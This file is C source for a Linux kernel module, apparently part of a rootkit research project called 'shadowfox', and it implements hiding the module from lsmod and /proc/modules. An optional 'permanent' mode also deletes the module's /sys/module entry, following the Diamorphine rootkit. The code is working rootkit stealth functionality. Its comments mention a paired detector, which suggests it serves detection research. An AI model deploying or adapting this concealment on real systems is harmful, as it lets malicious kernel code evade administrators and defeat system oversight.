// SPDX-License-Identifier: GPL-2.0
/*
 * shadowfox: module-list concealment.
 *
 * Two modes selected at hide-time by the `permanent` argument:
 *
 *   permanent=false (default Stage 1 behaviour)
 *     Unlinks THIS_MODULE from the kernel's "modules" linked list
 *     only. /proc/modules and lsmod hide it; /sys/module/<name>
 *     stays present. find_module() walks the same list we left, so
 *     `rmmod shadowfox` fails with -ENOENT until sf_restore() puts
 *     us back. Clean restore is supported and clean unload works
 *     afterwards.
 *
 *   permanent=true ("Diamorphine mode")
 *     In addition to the list unlink, calls kobject_del() on
 *     THIS_MODULE->mkobj.kobj. /sys/module/<name> disappears too.
 *     kobject_del() recursively destroys the kobject's children
 *     (sections/, parameters/, holders/, refcnt), which are built
 *     by the kernel's module loader (mod_sysfs_setup) and CANNOT be
 *     reinstated cleanly from out-of-tree code. Restore is therefore
 *     disabled — sf_restore() returns -EPERM thereafter and the
 *     module is unloadable until reboot. delete_module(2) called
 *     directly will succeed but emit WARN_ON_ONCE from
 *     sysfs_remove_group on the missing child groups; libkmod
 *     refuses rmmod outright because /sys/module/<name>/holders is
 *     gone. Both behaviours are expected and documented.
 *
 * We deliberately leave the kernel's mod_tree (address-lookup
 * RB-tree) alone in both modes. That asymmetry between "module list
 * says I do not exist" and "mod_tree says I do" is what the paired
 * lighthouse detector exploits, irrespective of the mode chosen.
 *
 * Locking: list (and kobject) mutation runs under module_mutex, the
 * lock the kernel itself uses to serialise module-list walks.
 *
 * References:
 *   - Diamorphine (m0nad): list_del + kobject_del without restore.
 *     The "permanent" mode here matches that stance directly.
 *   - Reptile (f0rb1dd3n): list_del with a more elaborate sysfs
 *     scheme; out of scope for Stage 1.
 *   - LWN article on the 5.7 kallsyms_lookup_name unexport.
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/errno.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/printk.h>

#include "hide_module.h"
#include "symbols.h"

static bool sf_hidden;
static bool sf_hidden_permanently;
static struct list_head *sf_saved_prev;

bool sf_is_hidden(void)
{
	return sf_hidden;
}

int sf_hide(bool permanent)
{
	mutex_lock(sf_module_mutex);

	if (sf_hidden) {
		mutex_unlock(sf_module_mutex);
		return 0;
	}

	/*
	 * Save list.prev so restore can re-insert at the same slot.
	 * list_del_init zeroes the link, so the snapshot has to come
	 * before the unlink. (Only meaningful in non-permanent mode;
	 * permanent mode never restores.)
	 */
	sf_saved_prev = THIS_MODULE->list.prev;
	list_del_init(&THIS_MODULE->list);

	if (permanent) {
		/*
		 * kobject_del() also drops THIS_MODULE->mkobj.kobj.parent
		 * to NULL and destroys child kobjects. Restoration would
		 * require rebuilding the children from scratch — out of
		 * scope. We accept this as a one-way operation.
		 */
		kobject_del(&THIS_MODULE->mkobj.kobj);
		sf_hidden_permanently = true;
	}

	sf_hidden = true;
	mutex_unlock(sf_module_mutex);

	if (permanent)
		pr_info("hidden permanently (modules list + /sys/module); reboot required to unload\n");
	else
		pr_info("hidden from modules list (/sys/module entry stays visible — list-only mode)\n");
	return 0;
}

int sf_restore(void)
{
	mutex_lock(sf_module_mutex);

	if (!sf_hidden) {
		mutex_unlock(sf_module_mutex);
		return 0;
	}

	if (sf_hidden_permanently) {
		mutex_unlock(sf_module_mutex);
		pr_warn("restore refused: permanent_hide=1 was used at hide-time; reboot required to unload\n");
		return -EPERM;
	}

	list_add(&THIS_MODULE->list, sf_saved_prev);

	sf_hidden = false;
	mutex_unlock(sf_module_mutex);

	pr_info("restored to modules list\n");
	return 0;
}
